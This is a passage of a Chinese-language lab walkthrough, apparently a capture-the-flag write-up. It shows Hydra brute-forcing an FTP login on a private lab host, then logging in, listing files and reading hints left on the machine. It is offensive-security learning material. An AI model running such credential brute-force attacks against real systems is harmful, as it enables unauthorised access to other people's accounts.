Hydra <span class="token punctuation">(</span>https://github.com/vanhauser-thc/thc-hydra<span class="token punctuation">)</span> starting at <span class="token number">2024</span>-04-20 <span class="token number">12</span>:26:34
<span class="token punctuation">[</span>DATA<span class="token punctuation">]</span> max <span class="token number">16</span> tasks per <span class="token number">1</span> server, overall <span class="token number">16</span> tasks, <span class="token number">14344399</span> login tries <span class="token punctuation">(</span>l:1/p:14344399<span class="token punctuation">)</span>, ~896525 tries per task
<span class="token punctuation">[</span>DATA<span class="token punctuation">]</span> attacking ftp://192.168.56.156:21/
<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span><span class="token punctuation">[</span>ftp<span class="token punctuation">]</span> host: <span class="token number">192.168</span>.56.156   login: juan   password: alexis
<span class="token number">1</span> of <span class="token number">1</span> target successfully completed, <span class="token number">1</span> valid password found
Hydra <span class="token punctuation">(</span>https://github.com/vanhauser-thc/thc-hydra<span class="token punctuation">)</span> finished at <span class="token number">2024</span>-04-20 <span class="token number">12</span>:27:09</code></pre>
<p>juan的密码是<code>alexis</code></p>
<h2 id="ftp连接"><a href="#ftp连接" class="headerlink" title="ftp连接"></a>ftp连接</h2><pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># ftp 192.168.56.156 </span>
Connected to <span class="token number">192.168</span>.56.156.
<span class="token number">220</span> <span class="token punctuation">(</span>vsFTPd <span class="token number">3.0</span>.3<span class="token punctuation">)</span>
Name <span class="token punctuation">(</span><span class="token number">192.168</span>.56.156:root<span class="token punctuation">)</span>: juan
<span class="token number">331</span> Please specify the password.
Password: 
<span class="token number">230</span> Login successful.
Remote system <span class="token builtin class-name">type</span> is UNIX.
Using binary mode to transfer files.
ftp<span class="token operator">></span> <span class="token function">ls</span> <span class="token parameter variable">-al</span>
<span class="token number">229</span> Entering Extended Passive Mode <span class="token punctuation">(</span><span class="token operator">||</span><span class="token operator">|</span><span class="token number">13109</span><span class="token operator">|</span><span class="token punctuation">)</span>
<span class="token number">150</span> Here comes the directory listing.
drwxr-xr-x   <span class="token number">14</span> <span class="token number">0</span>        <span class="token number">0</span>            <span class="token number">4096</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> <span class="token builtin class-name">.</span>
drwxr-xr-x   <span class="token number">14</span> <span class="token number">0</span>        <span class="token number">0</span>            <span class="token number">4096</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> <span class="token punctuation">..</span>
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>               <span class="token number">0</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> file1
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>               <span class="token number">0</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> file10
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>               <span class="token number">0</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> file100
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>               <span class="token number">0</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> file11
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>               <span class="token number">0</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> file12
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>               <span class="token number">0</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> file13
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>               <span class="token number">0</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> file14
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>               <span class="token number">0</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> file15
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>               <span class="token number">0</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> file16
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>               <span class="token number">0</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> file17
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>               <span class="token number">0</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> file18
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>               <span class="token number">0</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> file19
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>               <span class="token number">0</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> file2
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>               <span class="token number">0</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> file20
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>               <span class="token number">0</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> file21
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>               <span class="token number">0</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> file22
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>               <span class="token number">0</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> file23
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>               <span class="token number">0</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> file24
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>               <span class="token number">0</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> file25
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>               <span class="token number">0</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> file26
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>               <span class="token number">0</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> file27
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>               <span class="token number">0</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> file28
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>               <span class="token number">0</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> file29
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>               <span class="token number">0</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> file3
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>               <span class="token number">0</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> file30
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>               <span class="token number">0</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> file31
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>               <span class="token number">0</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> file32
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>               <span class="token number">0</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> file33
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>               <span class="token number">0</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> file34
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>               <span class="token number">0</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> file35
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>               <span class="token number">0</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> file36
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>               <span class="token number">0</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> file37
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>               <span class="token number">0</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> file38
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>               <span class="token number">0</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> file39
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>               <span class="token number">0</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> file4
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>               <span class="token number">0</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> file40
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>               <span class="token number">0</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> file41
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>               <span class="token number">0</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> file42
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>               <span class="token number">0</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> file43
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>               <span class="token number">0</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> file44
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>               <span class="token number">0</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> file45
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>               <span class="token number">0</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> file46
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>               <span class="token number">0</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> file47
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>               <span class="token number">0</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> file48
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>               <span class="token number">0</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> file49
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>               <span class="token number">0</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> file5
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>               <span class="token number">0</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> file50
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>               <span class="token number">0</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> file51
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>               <span class="token number">0</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> file52
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>               <span class="token number">0</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> file53
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>               <span class="token number">0</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> file54
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>               <span class="token number">0</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> file55
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>               <span class="token number">0</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> file56
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>               <span class="token number">0</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> file57
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>               <span class="token number">0</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> file58
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>               <span class="token number">0</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> file59
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>               <span class="token number">0</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> file6
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>               <span class="token number">0</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> file60
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>               <span class="token number">0</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> file61
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>               <span class="token number">0</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> file62
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>               <span class="token number">0</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> file63
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>               <span class="token number">0</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> file64
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>               <span class="token number">0</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> file65
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>               <span class="token number">0</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> file66
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>               <span class="token number">0</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> file67
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>               <span class="token number">0</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> file68
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>               <span class="token number">0</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> file69
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>               <span class="token number">0</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> file7
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>               <span class="token number">0</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> file70
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>               <span class="token number">0</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> file71
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>               <span class="token number">0</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> file72
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>               <span class="token number">0</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> file73
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>               <span class="token number">0</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> file74
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>               <span class="token number">0</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> file75
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>               <span class="token number">0</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> file76
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>               <span class="token number">0</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> file77
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>               <span class="token number">0</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> file78
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>               <span class="token number">0</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> file79
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>               <span class="token number">0</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> file8
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>              <span class="token number">36</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> file80
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>               <span class="token number">0</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> file81
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>               <span class="token number">0</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> file82
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>               <span class="token number">0</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> file83
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>               <span class="token number">0</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> file84
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>               <span class="token number">0</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> file85
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>               <span class="token number">0</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> file86
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>               <span class="token number">0</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> file87
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>               <span class="token number">0</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> file88
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>               <span class="token number">0</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> file89
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>               <span class="token number">0</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> file9
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>               <span class="token number">0</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> file90
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>               <span class="token number">0</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> file91
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>               <span class="token number">0</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> file92
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>               <span class="token number">0</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> file93
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>               <span class="token number">0</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> file94
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>               <span class="token number">0</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> file95
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>               <span class="token number">0</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> file96
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>               <span class="token number">0</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> file97
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>               <span class="token number">0</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> file98
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>               <span class="token number">0</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> file99
drwxr-xr-x    <span class="token number">2</span> <span class="token number">0</span>        <span class="token number">0</span>            <span class="token number">4096</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> fold10
drwxr-xr-x    <span class="token number">2</span> <span class="token number">0</span>        <span class="token number">0</span>            <span class="token number">4096</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> fold11
drwxr-xr-x    <span class="token number">2</span> <span class="token number">0</span>        <span class="token number">0</span>            <span class="token number">4096</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> fold12
drwxr-xr-x    <span class="token number">2</span> <span class="token number">0</span>        <span class="token number">0</span>            <span class="token number">4096</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> fold13
drwxr-xr-x    <span class="token number">2</span> <span class="token number">0</span>        <span class="token number">0</span>            <span class="token number">4096</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> fold14
drwxr-xr-x    <span class="token number">2</span> <span class="token number">0</span>        <span class="token number">0</span>            <span class="token number">4096</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> fold15
drwxr-xr-x    <span class="token number">2</span> <span class="token number">0</span>        <span class="token number">0</span>            <span class="token number">4096</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> fold4
drwxr-xr-x    <span class="token number">2</span> <span class="token number">0</span>        <span class="token number">0</span>            <span class="token number">4096</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> fold5
drwxr-xr-x    <span class="token number">2</span> <span class="token number">0</span>        <span class="token number">0</span>            <span class="token number">4096</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> fold6
drwxr-xr-x    <span class="token number">2</span> <span class="token number">0</span>        <span class="token number">0</span>            <span class="token number">4096</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> fold7
drwxr-xr-x    <span class="token number">2</span> <span class="token number">0</span>        <span class="token number">0</span>            <span class="token number">4096</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> fold8
drwxr-xr-x    <span class="token number">2</span> <span class="token number">0</span>        <span class="token number">0</span>            <span class="token number">4096</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> fold9
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>              <span class="token number">58</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> fole32
<span class="token number">226</span> Directory send OK.</code></pre>
<p>有多好文件，不过好多都是空的<br>把有信息的文件都列出来</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># cat file80                                                          </span>
Hi, I<span class="token string">'m the sysadmin. I am bored...                                 
┌──(root㉿kali2)-[~/Desktop]
└─# cat fole32
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabba                                                                  
┌──(root㉿kali2)-[~/Desktop]
└─# rm file80                                       
┌──(root㉿kali2)-[~/Desktop]
└─# rm fole32
┌──(root㉿kali2)-[~/Desktop]
└─# cat .test.txt 
Hi, I'</span>am juan another time. I want you to know that I found <span class="token string">"cookie"</span> <span class="token keyword">in</span> a <span class="token function">file</span> called <span class="token string">"zlcnffjbeq.gkg"</span> into my home folder. I think it's from another user, IDK<span class="token punctuation">..</span>.              
┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># cat yt.txt             </span>
Thanks to all my YT subscribers<span class="token operator">!</span>               
┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># cat passwd.txt  </span>
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠛⠛⠛⠋⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠙⠛⠛⠛⠿⠻⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⡀⠠⠤⠒⢂⣉⣉⣉⣑⣒⣒⠒⠒⠒⠒⠒⠒⠒⠀⠀⠐⠒⠚⠻⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⡠⠔⠉⣀⠔⠒⠉⣀⣀⠀⠀⠀⣀⡀⠈⠉⠑⠒⠒⠒⠒⠒⠈⠉⠉⠉⠁⠂⠀⠈⠙⢿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⠔⠁⠠⠖⠡⠔⠊⠀⠀⠀⠀⠀⠀⠀⠐⡄⠀⠀⠀⠀⠀⠀⡄⠀⠀⠀⠀⠉⠲⢄⠀⠀⠀⠈⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀⠀⠊⠀⢀⣀⣤⣤⣤⣤⣀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠜⠀⠀⠀⠀⣀⡀⠀⠈⠃⠀⠀⠀⠸⣿⣿⣿⣿
⣿⣿⣿⣿⡿⠥⠐⠂⠀⠀⠀⠀⡄⠀⠰⢺⣿⣿⣿⣿⣿⣟⠀⠈⠐⢤⠀⠀⠀⠀⠀⠀⢀⣠⣶⣾⣯⠀⠀⠉⠂⠀⠠⠤⢄⣀⠙⢿⣿⣿
⣿⡿⠋⠡⠐⠈⣉⠭⠤⠤⢄⡀⠈⠀⠈⠁⠉⠁⡠⠀⠀⠀⠉⠐⠠⠔⠀⠀⠀⠀⠀⠲⣿⠿⠛⠛⠓⠒⠂⠀⠀⠀⠀⠀⠀⠠⡉⢢⠙⣿
⣿⠀⢀⠁⠀⠊⠀⠀⠀⠀⠀⠈⠁⠒⠂⠀⠒⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⢀⣀⡠⠔⠒⠒⠂⠀⠈⠀⡇⣿
⣿⠀⢸⠀⠀⠀⢀⣀⡠⠋⠓⠤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠄⠀⠀⠀⠀⠀⠀⠈⠢⠤⡀⠀⠀⠀⠀⠀⠀⢠⠀⠀⠀⡠⠀⡇⣿
⣿⡀⠘⠀⠀⠀⠀⠀⠘⡄⠀⠀⠀⠈⠑⡦⢄⣀⠀⠀⠐⠒⠁⢸⠀⠀⠠⠒⠄⠀⠀⠀⠀⠀⢀⠇⠀⣀⡀⠀⠀⢀⢾⡆⠀⠈⡀⠎⣸⣿
⣿⣿⣄⡈⠢⠀⠀⠀⠀⠘⣶⣄⡀⠀⠀⡇⠀⠀⠈⠉⠒⠢⡤⣀⡀⠀⠀⠀⠀⠀⠐⠦⠤⠒⠁⠀⠀⠀⠀⣀⢴⠁⠀⢷⠀⠀⠀⢰⣿⣿
⣿⣿⣿⣿⣇⠂⠀⠀⠀⠀⠈⢂⠀⠈⠹⡧⣀⠀⠀⠀⠀⠀⡇⠀⠀⠉⠉⠉⢱⠒⠒⠒⠒⢖⠒⠒⠂⠙⠏⠀⠘⡀⠀⢸⠀⠀⠀⣿⣿⣿
⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠑⠄⠰⠀⠀⠁⠐⠲⣤⣴⣄⡀⠀⠀⠀⠀⢸⠀⠀⠀⠀⢸⠀⠀⠀⠀⢠⠀⣠⣷⣶⣿⠀⠀⢰⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠁⢀⠀⠀⠀⠀⠀⡙⠋⠙⠓⠲⢤⣤⣷⣤⣤⣤⣤⣾⣦⣤⣤⣶⣿⣿⣿⣿⡟⢹⠀⠀⢸⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣧⡀⠀⠀⠀⠀⠀⠀⠀⠑⠀⢄⠀⡰⠁⠀⠀⠀⠀⠀⠈⠉⠁⠈⠉⠻⠋⠉⠛⢛⠉⠉⢹⠁⢀⢇⠎⠀⠀⢸⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣀⠈⠢⢄⡉⠂⠄⡀⠀⠈⠒⠢⠄⠀⢀⣀⣀⣰⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⢀⣎⠀⠼⠊⠀⠀⠀⠘⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⡀⠉⠢⢄⡈⠑⠢⢄⡀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠁⠀⠀⢀⠀⠀⠀⠀⠀⢻⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣀⡈⠑⠢⢄⡀⠈⠑⠒⠤⠄⣀⣀⠀⠉⠉⠉⠉⠀⠀⠀⣀⡀⠤⠂⠁⠀⢀⠆⠀⠀⢸⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣄⡀⠁⠉⠒⠂⠤⠤⣀⣀⣉⡉⠉⠉⠉⠉⢀⣀⣀⡠⠤⠒⠈⠀⠀⠀⠀⣸⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣶⣶⣤⣤⣤⣤⣀⣀⣤⣤⣤⣶⣾⣿⣿⣿⣿⣿</code></pre>
<p>除了说在它的home下有一个<code>zlcnffjbeq.gkg</code>文件里面有cookie其他也没什么有用信息</p>
